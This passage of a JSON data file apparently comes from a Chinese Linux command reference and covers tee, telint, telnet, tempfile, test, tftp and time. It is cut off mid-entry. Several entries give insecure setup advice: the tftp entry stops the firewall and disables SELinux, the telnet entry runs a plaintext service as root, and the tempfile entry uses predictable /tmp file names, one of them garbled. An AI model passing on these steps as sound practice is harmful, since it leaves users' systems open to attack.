        "title": "tee",
        "des": "从标准输入读取数据并重定向到标准输出和文件。",
        "body": "<h1 id=\"tee\">tee</h1>\n<p>从标准输入读取数据并重定向到标准输出和文件。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">tee [<span class=\"hljs-symbol\">OPTION</span>]... [<span class=\"hljs-symbol\">FILE</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>需要同时查看数据内容并输出到文件时使用。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>FILE（可选）：要输出的文件，可以为一或多个。</p>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">长选项与短选项等价\n\n-<span class=\"hljs-keyword\">a</span>, <span class=\"hljs-comment\">--append               追加到文件中而不是覆盖。</span>\n-i, <span class=\"hljs-comment\">--ignore-interrupts    忽略中断信号（Ctrl+c中断操作无效）。</span>\n-p                         诊断写入非管道的错误。\n<span class=\"hljs-comment\">--output-error[=MODE]      设置写错误时的行为，请查看下方的MODE部分。</span>\n<span class=\"hljs-comment\">--help                     显示帮助信息并退出。</span>\n<span class=\"hljs-comment\">--version                  显示版本信息并退出。</span>\n\nMODE决定了当出现写错误时的输出行为，可用的MODE如下：\n\n<span class=\"hljs-string\">'warn'</span>           当写入到任何输出报错时诊断。\n<span class=\"hljs-string\">'warn-nopipe'</span>    当写入到任何输出（而不是管道）报错时诊断。\n<span class=\"hljs-string\">'exit'</span>           当写入到任何输出报错时退出。\n<span class=\"hljs-string\">'exit-nopipe'</span>    当写入到任何输出（而不是管道）报错时退出。\n\n-p选项的指定的默认MODE为<span class=\"hljs-string\">'warn-nopipe'</span>。\n当<span class=\"hljs-string\">'--output-error'</span>没有在选项中时，默认的操作是当写入到管道报错时立刻退出，诊断错误信息并写入到非管道输出。\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回状态为成功除非给出了非法选项或非法参数。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 将进程信息通过管道输出到标准输出（终端）并覆盖写入到文件中。</span>\nps -ef |tee info_a.<span class=\"hljs-built_in\">log</span> info_b.<span class=\"hljs-built_in\">log</span>\n\n<span class=\"hljs-comment\"># 将进程信息通过管道输出到标准输出（终端）并追加写入到文件中。</span>\nps -ef |tee -<span class=\"hljs-keyword\">a</span> info_a.<span class=\"hljs-built_in\">log</span> info_b.<span class=\"hljs-built_in\">log</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 tee</code>或<code>info coreutils 'tee invocation'</code>。</li>\n<li>存在缓存机制，每1024个字节将输出一次。若从管道接收输入数据，应该是缓冲区满，才将数据转存到指定的文件中。若文件内容不到1024个字节，则接收从标准输入设备读入的数据后，将刷新一次缓冲区，并转存数据到指定文件。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "telint",
        "des": "切换当前正在运行系统的运行等级",
        "body": "<h1 id=\"telint\">telint</h1>\n<p>切换当前正在运行系统的运行等级</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>telint命令</strong> 用于切换当前正在运行的Linux系统的运行等级。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">telint</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-t：指定等待的秒数。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>运行等级：指定要切换的运行等级。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "telnet",
        "des": "登录远程主机和管理(测试ip端口是否连通)",
        "body": "<h1 id=\"telnet\">telnet</h1>\n<p>登录远程主机和管理(测试ip端口是否连通)</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>telnet命令</strong> 用于登录远程主机，对远程主机进行管理。telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。但仍然有很多别的系统可能采用了telnet方式来提供远程登录，因此弄清楚telnet客户端的使用方式仍是很有必要的。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">telnet</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-8：允许使用8位字符资料，包括输入与输出；</span>\n<span class=\"hljs-deletion\">-a：尝试自动登入远端系统；</span>\n<span class=\"hljs-deletion\">-b&lt;主机别名&gt;：使用别名指定远端主机名称；</span>\n<span class=\"hljs-deletion\">-c：不读取用户专属目录里的.telnetrc文件；</span>\n<span class=\"hljs-deletion\">-d：启动排错模式；</span>\n<span class=\"hljs-deletion\">-e&lt;脱离字符&gt;：设置脱离字符；</span>\n<span class=\"hljs-deletion\">-E：滤除脱离字符；</span>\n<span class=\"hljs-deletion\">-f：此参数的效果和指定\"-F\"参数相同；</span>\n<span class=\"hljs-deletion\">-F：使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机；</span>\n<span class=\"hljs-deletion\">-k&lt;域名&gt;：使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名；</span>\n<span class=\"hljs-deletion\">-K：不自动登入远端主机；</span>\n<span class=\"hljs-deletion\">-l&lt;用户名称&gt;：指定要登入远端主机的用户名称；</span>\n<span class=\"hljs-deletion\">-L：允许输出8位字符资料；</span>\n<span class=\"hljs-deletion\">-n&lt;记录文件&gt;：指定文件记录相关信息；</span>\n<span class=\"hljs-deletion\">-r：使用类似rlogin指令的用户界面；</span>\n<span class=\"hljs-deletion\">-S&lt;服务类型&gt;：设置telnet连线所需的ip TOS信息；</span>\n<span class=\"hljs-deletion\">-x：假设主机有支持数据加密的功能，就使用它；</span>\n<span class=\"hljs-deletion\">-X&lt;认证形态&gt;：关闭指定的认证形态。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  远程主机：指定要登录进行管理的远程主机；</li>\n<li>  端口：指定TELNET协议使用的端口号。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">$ telnet <span class=\"hljs-number\">192.168.2.10</span>\nTrying <span class=\"hljs-number\">192.168.2.10</span>...\nConnected to <span class=\"hljs-number\">192.168.2.10</span> (<span class=\"hljs-number\">192.168.2.10</span>).\nEscape character is '^]'.\n\n    localhost (Linux release <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">6.18-274</span>.<span class=\"hljs-number\">18</span>.<span class=\"hljs-number\">1</span>.el5 #<span class=\"hljs-number\">1</span> SMP Thu Feb <span class=\"hljs-number\">9 12:45:44</span> EST <span class=\"hljs-number\">2012</span>) (<span class=\"hljs-number\">1</span>)\n\nlogin: root\nPassword:\nLogin incorrect\n</code></pre>\n<p>一般情况下不允许root从远程登录，可以先用普通账号登录，然后再用su -切到root用户。</p>\n<pre><code class=\"language-shell\">$ telnet 192.168.188.132\nTrying 192.168.188.132<span class=\"hljs-built_in\">..</span>.\ntelnet: connect <span class=\"hljs-keyword\">to</span><span class=\"hljs-built_in\"> address </span>192.168.188.132:<span class=\"hljs-built_in\"> Connection </span>refused\ntelnet: Unable <span class=\"hljs-keyword\">to</span> connect <span class=\"hljs-keyword\">to</span> remote host\n</code></pre>\n<p>处理这种情况方法：</p>\n<ol>\n<li>确认ip地址是否正确？</li>\n<li>确认ip地址对应的主机是否已经开机？</li>\n<li>如果主机已经启动，确认路由设置是否设置正确？（使用route命令查看）</li>\n<li>如果主机已经启动，确认主机上是否开启了telnet服务？（使用netstat命令查看，TCP的23端口是否有LISTEN状态的行）</li>\n<li>如果主机已经启动telnet服务，确认防火墙是否放开了23端口的访问？（使用iptables-save查看）</li>\n</ol>\n<p><strong>启动telnet服务</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">service xinetd restart</span>\n</code></pre>\n<p>配置参数，通常的配置如下：</p>\n<pre><code class=\"language-shell\">service telnet\n{\n    <span class=\"hljs-attr\">disable</span> = no <span class=\"hljs-comment\">#启用</span>\n    <span class=\"hljs-attr\">flags</span> = REUSE <span class=\"hljs-comment\">#socket可重用</span>\n    <span class=\"hljs-attr\">socket_type</span> = stream <span class=\"hljs-comment\">#连接方式为TCP</span>\n    <span class=\"hljs-attr\">wait</span> = no <span class=\"hljs-comment\">#为每个请求启动一个进程</span>\n    <span class=\"hljs-attr\">user</span> = root <span class=\"hljs-comment\">#启动服务的用户为root</span>\n    <span class=\"hljs-attr\">server</span> = /usr/sbin/<span class=\"hljs-keyword\">in</span>.telnetd <span class=\"hljs-comment\">#要激活的进程</span>\n    log_on_failure += USERID <span class=\"hljs-comment\">#登录失败时记录登录用户名</span>\n}\n</code></pre>\n<p>如果要配置允许登录的客户端列表，加入</p>\n<pre><code><span class=\"hljs-attr\">only_from</span> = <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">0.2</span> <span class=\"hljs-comment\">#只允许192.168.0.2登录</span>\n</code></pre>\n<p>如果要配置禁止登录的客户端列表，加入</p>\n<pre><code><span class=\"hljs-attribute\">no_access</span> = <span class=\"hljs-number\">192</span>.<span class=\"hljs-number\">168</span>.<span class=\"hljs-number\">0</span>.{<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>} #禁止<span class=\"hljs-number\">192.168.0.2</span>、<span class=\"hljs-number\">192.168.0.3</span>、<span class=\"hljs-number\">192.168.0.4</span>登录\n</code></pre>\n<p>如果要设置开放时段，加入</p>\n<pre><code><span class=\"hljs-attribute\">access_times</span> = <span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">00</span>-<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">00</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">00</span>-<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">00</span> # 每天只有这两个时段开放服务（我们的上班时间：P）\n</code></pre>\n<p>如果你有两个IP地址，一个是私网的IP地址如192.168.0.2，一个是公网的IP地址如218.75.74.83，如果你希望用户只能从私网来登录telnet服务，那么加入</p>\n<pre><code><span class=\"hljs-attribute\">bind</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">0.2</span>\n</code></pre>\n<p>各配置项具体的含义和语法可参考xined配置文件属性说明（man xinetd.conf）</p>\n<p>配置端口，修改services文件：</p>\n<pre><code class=\"language-shell\"># vi <span class=\"hljs-regexp\">/etc/</span>services\n</code></pre>\n<p>找到以下两句</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">telnet</span> <span class=\"hljs-number\">23</span>/tcp\n<span class=\"hljs-attribute\">telnet</span> <span class=\"hljs-number\">23</span>/udp\n</code></pre>\n<p>如果前面有#字符，就去掉它。telnet的默认端口是23，这个端口也是黑客端口扫描的主要对象，因此最好将这个端口修改掉，修改的方法很简单，就是将23这个数字修改掉，改成大一点的数字，比如61123。注意，1024以下的端口号是internet保留的端口号，因此最好不要用，还应该注意不要与其它服务的端口冲突。</p>\n<p>启动服务：</p>\n<pre><code><span class=\"hljs-attribute\">service xinetd restart</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "tempfile",
        "des": "shell中给临时文件命名",
        "body": "<h1 id=\"tempfile\">tempfile</h1>\n<p>shell中给临时文件命名</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>有时候在写Shell脚本的时候需要一些临时存储数据的才做，最适合存储临时文件数据的位置就是<code>/tmp</code>，因为该目录中所有的内容在系统重启后就会被清空。下面是两种方法为临时数据生成标准的文件名。</p>\n<h3 id=\"tempfile命令\">tempfile命令</h3>\n<p><code>tempfile命令</code>只有在基于Debian的发行版中才默认自带，比如Ubuntu，其他发行版没有这个命令。</p>\n<p>用tempfile命令为一个临时文件命名：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attr\">temp_file_name</span>=$(tempfile)\n</code></pre>\n<p>用一个加带了随机数的文件名作为临时文件命名：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attr\">temp_file_name</span>=<span class=\"hljs-string\">\"/tmp/file_$RANDOM\"</span>\n</code></pre>\n<p>$RANDOM是一个返回随机数的环境变量。</p>\n<h3 id=\"变量\">$$变量</h3>\n<p>如果没有tempfile命令的Linux发行版，也可以使用自己的临时文件名：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attr\">temp_file_name</span>=<span class=\"hljs-string\">\"/tmp/file.$\"</span>\n</code></pre>\n<p><code>$$</code>是系统预定义变量，显示当前所在进程的进程号，用<code>.$$</code>作为添加的后缀会被扩展成当前运行脚本的进程id。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "test",
        "des": "执行条件表达式。",
        "body": "<h1 id=\"test\">test</h1>\n<p>执行条件表达式。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">test </span>[expr]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>执行条件表达式。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<h3 id=\"文件操作符：\">文件操作符：</h3>\n<pre><code class=\"language-shell\">-a <span class=\"hljs-keyword\">FILE</span>    如果文件存在，则为true。\n-b <span class=\"hljs-keyword\">FILE</span>    如果文件是块特殊的，则为true。\n-c <span class=\"hljs-keyword\">FILE</span>    如果文件是特殊字符，则为true。\n-d <span class=\"hljs-keyword\">FILE</span>    如果文件是目录，则为true。\n-e <span class=\"hljs-keyword\">FILE</span>    如果文件存在，则为true。\n-f <span class=\"hljs-keyword\">FILE</span>    如果文件存在并且是常规文件，则为true。\n-g <span class=\"hljs-keyword\">FILE</span>    如果文件是<span class=\"hljs-keyword\">set</span>-group-id，则为true。\n-h <span class=\"hljs-comment\">FILE</span>    如果文件是符号链接，则为<span class=\"hljs-comment\">true</span>。\n-L <span class=\"hljs-comment\">FILE</span>    如果文件是符号链接，则为<span class=\"hljs-comment\">true</span>。\n-k <span class=\"hljs-comment\">FILE</span>    如果文件的粘滞位（<span class=\"hljs-comment\">sticky</span>）设置了，则为<span class=\"hljs-comment\">true</span>。\n-p <span class=\"hljs-comment\">FILE</span>    如果文件是命名管道，则为<span class=\"hljs-comment\">true</span>。\n-r <span class=\"hljs-comment\">FILE</span>    如果您可以读取文件，则为<span class=\"hljs-comment\">true</span>。\n-s <span class=\"hljs-comment\">FILE</span>    如果文件存在且不为空，则为<span class=\"hljs-comment\">true</span>。\n-S <span class=\"hljs-comment\">FILE</span>    如果文件是套接字，则为<span class=\"hljs-comment\">true</span>。\n-t <span class=\"hljs-comment\">FD</span>      如果在终端上打开<span class=\"hljs-comment\">FD</span>，则为<span class=\"hljs-comment\">True</span>。\n-u <span class=\"hljs-comment\">FILE</span>    如果文件是<span class=\"hljs-comment\">set-user-id</span>，则为<span class=\"hljs-comment\">true</span>。\n-w <span class=\"hljs-comment\">FILE</span>    如果文件可写，则为<span class=\"hljs-comment\">true</span>。\n-x <span class=\"hljs-comment\">FILE</span>    如果您可以执行文件，则为<span class=\"hljs-comment\">true</span>。\n-O <span class=\"hljs-comment\">FILE</span>    如果文件有效地归您所有，则为<span class=\"hljs-comment\">true</span>。\n-G <span class=\"hljs-comment\">FILE</span>    如果文件有效地归您的组所有，则为<span class=\"hljs-comment\">true</span>。\n-N <span class=\"hljs-comment\">FILE</span>    如果文件自上次读取以来已被修改，则为<span class=\"hljs-comment\">true</span>。\n    \nFILE1 <span class=\"hljs-comment\">-nt FILE2</span>    根据修改日期，如果 <span class=\"hljs-comment\">file1</span> 比 <span class=\"hljs-comment\">file2</span> 新，则为<span class=\"hljs-comment\">true</span>。\nFILE1 <span class=\"hljs-comment\">-ot FILE2</span>    根据修改日期，如果 <span class=\"hljs-comment\">file1</span> 比 <span class=\"hljs-comment\">file2</span> 旧，则为<span class=\"hljs-comment\">true</span>。\nFILE1 <span class=\"hljs-comment\">-ef FILE2</span>    如果 <span class=\"hljs-comment\">file1</span> 为 <span class=\"hljs-comment\">file2</span> 的硬链接，则为<span class=\"hljs-comment\">true</span>。\n</code></pre>\n<h3 id=\"字符串运算符：\">字符串运算符：</h3>\n<pre><code class=\"language-shell\">-z <span class=\"hljs-built_in\">STRING</span>              如果字符串为空，则为<span class=\"hljs-literal\">true</span>。\n-n <span class=\"hljs-built_in\">STRING</span>              如果字符串不为空，则为<span class=\"hljs-literal\">true</span>。\n<span class=\"hljs-built_in\">STRING</span>                 如果字符串不为空，则为<span class=\"hljs-literal\">true</span>。\nSTRING1 = STRING2      如果字符串相等，则为<span class=\"hljs-literal\">true</span>。\nSTRING1 ！= STRING2    如果字符串不相等，则为<span class=\"hljs-literal\">true</span>。\nSTRING1 &lt; STRING2      如果 STRING1 的字典排序在 STRING2 之前，则为<span class=\"hljs-literal\">true</span>。\nSTRING1 &gt; STRING2      如果 STRING1 在字典排序在 STRING2 之后，则为<span class=\"hljs-literal\">true</span>。\n</code></pre>\n<h3 id=\"其他运算符：\">其他运算符：</h3>\n<pre><code class=\"language-shell\">-o OPTION         如果启用了shell选项OPTION，则<span class=\"hljs-built_in\">为true</span>。\n-v VAR            如果设置了shell变量VAR，则<span class=\"hljs-built_in\">为true</span>。\n-R VAR            如果设置了shell变量VAR并且是变量引用，则<span class=\"hljs-built_in\">为true</span>。\n！EXPR            如果expr为假，则<span class=\"hljs-built_in\">为true</span>。\nEXPR1 -a EXPR2    如果expr1和expr2都<span class=\"hljs-built_in\">为true</span>，则<span class=\"hljs-built_in\">为true</span>。\nEXPR1 -o EXPR2    如果expr1或expr2<span class=\"hljs-built_in\">为true</span>，则<span class=\"hljs-built_in\">为true</span>。\narg1 OP arg2      算术表达式测试； OP是 -<span class=\"hljs-literal\">eq</span>，-<span class=\"hljs-literal\">ne</span>，-<span class=\"hljs-literal\">lt</span>，-<span class=\"hljs-literal\">le</span>，-<span class=\"hljs-literal\">gt</span>，-<span class=\"hljs-literal\">ge</span> 中的一个；算术表达式为真时返<span class=\"hljs-built_in\">回true</span>。\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>如果表达式执行结果为成功时返回0，当表达式执行结果为失败或给出非法参数时返回1。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 执行条件表达式并显示返回值。</span>\n[root<span class=\"hljs-variable\">@pc</span> root]<span class=\"hljs-variable\">$ </span>test ! <span class=\"hljs-string\">\"abc\"</span> == <span class=\"hljs-number\">123</span>; echo <span class=\"hljs-variable\">$?</span>\n0\n\n<span class=\"hljs-comment\"># 等价形式，注意：方括号 [ 后面的空格以及方括号 ] 前面的空格。</span>\n[root<span class=\"hljs-variable\">@pc</span> root]<span class=\"hljs-variable\">$ </span>[ ! <span class=\"hljs-string\">\"abc\"</span> == <span class=\"hljs-number\">123</span> ]; echo <span class=\"hljs-variable\">$?</span>\n0\n\n[root<span class=\"hljs-variable\">@pc</span> root]<span class=\"hljs-variable\">$ </span>[[ ! <span class=\"hljs-string\">\"abc\"</span> == <span class=\"hljs-number\">123</span> ]]; echo <span class=\"hljs-variable\">$?</span>\n0\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令等价于 <code>[</code>。</li>\n<li>编写 bash 条件表达式可用内建命令 <code>test</code>， <code>[</code> ，组合命令 <code>[[</code>；<blockquote>\n<ul>\n<li>关于条件表达式可以查看<a href=\"http://www.gnu.org/software/bash/manual/html_node/Bash-Conditional-Expressions.html#Bash-Conditional-Expressions\">这里</a>；</li>\n<li>关于内建命令的索引可以查看<a href=\"http://www.gnu.org/software/bash/manual/html_node/Builtin-Index.html#Builtin-Index\">这里</a>；</li>\n<li>关于组合命令的索引可以查看<a href=\"http://www.gnu.org/software/bash/manual/html_node/Reserved-Word-Index.html#Reserved-Word-Index\">这里</a></li>\n</ul>\n</blockquote>\n</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "tftp",
        "des": "在本机和tftp服务器之间使用TFTP协议传输文件",
        "body": "<h1 id=\"tftp\">tftp</h1>\n<p>在本机和tftp服务器之间使用TFTP协议传输文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>tftp命令</strong> 用在本机和tftp服务器之间使用TFTP协议传输文件。</p>\n<p>TFTP是用来下载远程文件的最简单网络协议，它其于UDP协议而实现。嵌入式linux的tftp开发环境包括两个方面：一是linux服务器端的tftp-server支持，二是嵌入式目标系统的tftp-client支持。因为u-boot本身内置支持tftp-client，所以嵌入式目标系统端就不用配置了。下面就详细介绍一下linux服务器端tftp-server的配置。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">tftp</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：指定与tftp服务器连接成功后，立即要执行的指令；</span>\n<span class=\"hljs-deletion\">-m：指定文件传输模式。可以是ASCII或者Binary；</span>\n<span class=\"hljs-deletion\">-v：显示指令详细执行过程；</span>\n<span class=\"hljs-deletion\">-V：显示指令版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>主机：指定tftp要联机的tftp服务器的ip地址或主机名。</p>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>1、安装tftp服务器</strong> </p>\n<p>需要安装xinetd、tftp和tftp-server 3个软件</p>\n<p>如果能上网，通过yum安装：</p>\n<pre><code class=\"language-shell\">yum <span class=\"hljs-keyword\">install</span> xinetd\nyum <span class=\"hljs-keyword\">install</span> tftp\nyum <span class=\"hljs-keyword\">install</span> tftp-server\n</code></pre>\n<p>如果不能上网，可以直接安装提供的rpm包：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rpm</span> -ivh xinetd-<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">14</span>-<span class=\"hljs-number\">18</span>.fc9.i386.rpm\n<span class=\"hljs-attribute\">rpm</span> -ivh tftp-<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">48</span>-<span class=\"hljs-number\">3</span>.fc9.i386.rpm\n<span class=\"hljs-attribute\">rpm</span> -ivh tftp-server-<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">48</span>-<span class=\"hljs-number\">3</span>.fc9.i386.rpm\n</code></pre>\n<p> <strong>2、配置tftp服务器</strong> </p>\n<p>修改/etc/xinetd.d/tftp文件，将其中的disable=yes改为disable=no。主要是设置TFTP服务器的根目录，开启服务。修改后的文件如下：</p>\n<pre><code class=\"language-shell\">service tftp\n{\n       socket_type           <span class=\"hljs-operator\">=</span>dgram\n       protocol              <span class=\"hljs-operator\">=</span>udp\n       wait                  <span class=\"hljs-operator\">=</span>yes\n       user                  <span class=\"hljs-operator\">=</span>root\n       server                <span class=\"hljs-operator\">=/</span>usr/sbin/in.tftpd\n       server_args           <span class=\"hljs-operator\">=</span>-s  /home/mike/tftpboot -c\n       disable               <span class=\"hljs-operator\">=</span>no\n       per_source            <span class=\"hljs-operator\">=</span><span class=\"hljs-number\">11</span>\n       cps                   <span class=\"hljs-operator\">=</span><span class=\"hljs-number\">100</span> <span class=\"hljs-number\">2</span>\n       flags                 <span class=\"hljs-operator\">=</span>IPv4\n}\n</code></pre>\n<p>说明：修改项<code>server_args= -s &lt;path&gt; -c</code>，其中<path>处可以改为你的tftp-server的根目录，参数-s指定chroot，-c指定了可以创建文件。</path></p>\n<p> <strong>3、启动tftp服务器并关闭防火墙</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/etc/i</span>nit.d/iptables stop        <span class=\"hljs-comment\"># 关闭防火墙</span>\nsudo <span class=\"hljs-regexp\">/sbin/</span>service xinetd start\n或\nservice xinetd restart\n<span class=\"hljs-regexp\">/etc/i</span>nit.d/xinetd start\n</code></pre>\n<p>看到启动[OK]就可以了</p>\n<p>4、查看tftp服务是否开启</p>\n<pre><code class=\"language-shell\">netstat -a <span class=\"hljs-string\">| grep tftp</span>\n</code></pre>\n<p>显示结果为<code>udp 0 0 *:tftp *:*</code>表明服务已经开启，就表明tftp配置成功了。</p>\n<p> <strong>5、tftp使用</strong> </p>\n<p>复制一个文件到tftp服务器目录，然后在主机启动tftp软件，进行简单测试。</p>\n<pre><code class=\"language-shell\">tftp <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.2</span>\ntftp&gt;<span class=\"hljs-keyword\">get</span> &lt;download <span class=\"hljs-built_in\">file</span>&gt; \n\ntftp&gt;<span class=\"hljs-keyword\">put</span> &lt;upload <span class=\"hljs-built_in\">file</span>&gt;\ntftp&gt;q\n</code></pre>\n<p> <strong>6、tftp命令用法如下</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">tftp</span> your-<span class=\"hljs-built_in\">ip</span>-address\n</code></pre>\n<p>进入TFTP操作：</p>\n<ul>\n<li><p>  connect：连接到远程tftp服务器</p>\n</li>\n<li><p>  mode：文件传输模式</p>\n</li>\n<li><p>  put：上传文件</p>\n</li>\n<li><p>  get：下载文件</p>\n</li>\n<li><p>  quit：退出</p>\n</li>\n<li><p>  verbose：显示详细的处理信息</p>\n</li>\n<li><p>  tarce：显示包路径</p>\n</li>\n<li><p>  status：显示当前状态信息</p>\n</li>\n<li><p>  binary：二进制传输模式</p>\n</li>\n<li><p>  ascii：ascii 传送模式</p>\n</li>\n<li><p>  rexmt：设置包传输的超时时间</p>\n</li>\n<li><p>  timeout：设置重传的超时时间</p>\n</li>\n<li><p>  help：帮助信息</p>\n</li>\n<li><p>  ? ：帮助信息</p>\n</li>\n<li><p><em>7、如果老是出现“AVC Denial, click icon to view”的错误，并不能传输文件，需要作如下修改</em>* </p>\n</li>\n</ul>\n<p>修改<code>/etc/sysconfig/selinux</code>,将SELINUX设定为disable，使用命令<code>setenforce 0</code>让selinux配置文件生效。</p>\n<p> <strong>8、Busybox中tftp命令的用法</strong> </p>\n<p>命令格式为：</p>\n<pre><code class=\"language-shell\">tftp <span class=\"hljs-selector-attr\">[option]</span> ... host <span class=\"hljs-selector-attr\">[port]</span>\n</code></pre>\n<p>如果要下载或上传文件的话是一定要用这些option的。</p>\n<pre><code class=\"language-shell\">-g 表示下载文件 (<span class=\"hljs-keyword\">get</span>)\n-p 表示上传文件 (<span class=\"hljs-keyword\">put</span>)\n-l 表示本地文件名 (<span class=\"hljs-keyword\">local</span> <span class=\"hljs-built_in\">file</span>)\n-r 表示远程主机的文件名 (remote <span class=\"hljs-built_in\">file</span>)\n</code></pre>\n<p>例如，要从远程主机192.168.1.2上下载 embedexpert，则应输入以下命令</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tftp</span> -g -r embedexpert <span class=\"hljs-number\">192.168.1.2</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "time",
        "des": "统计给定命令所花费的总时间",
        "body": "<h1 id=\"time\">time</h1>\n<p>统计给定命令所花费的总时间</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>time命令</strong> 用于统计给定命令所花费的总时间。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\"><span class=\"hljs-built_in\">time</span></span>(参数)</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>指令：指定需要运行的额指令及其参数。</p>\n<h3 id=\"实例\">实例</h3>\n<p>当测试一个程序或比较不同算法时，执行时间是非常重要的，一个好的算法应该是用时最短的。所有类UNIX系统都包含time命令，使用这个命令可以统计时间消耗。例如：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# <span class=\"hljs-type\">time</span> ls\nanaconda-ks.cfg  install.<span class=\"hljs-keyword\">log</span>  install.<span class=\"hljs-keyword\">log</span>.syslog  satools  <span class=\"hljs-type\">text</span>\n\n<span class=\"hljs-type\">real</span>    <span class=\"hljs-number\">0</span>m0<span class=\"hljs-number\">.009</span>s\n<span class=\"hljs-keyword\">user</span>    <span class=\"hljs-number\">0</span>m0<span class=\"hljs-number\">.002</span>s\nsys     <span class=\"hljs-number\">0</span>m0<span class=\"hljs-number\">.007</span>s\n</code></pre>\n<p>输出的信息分别显示了该命令所花费的real时间、user时间和sys时间。</p>\n<ul>\n<li>  real时间是指挂钟时间，也就是命令开始执行到结束的时间。这个短时间包括其他进程所占用的时间片，和进程被阻塞时所花费的时间。</li>\n<li>  user时间是指进程花费在用户模式中的CPU时间，这是唯一真正用于执行进程所花费的时间，其他进程和花费阻塞状态中的时间没有计算在内。</li>\n<li>  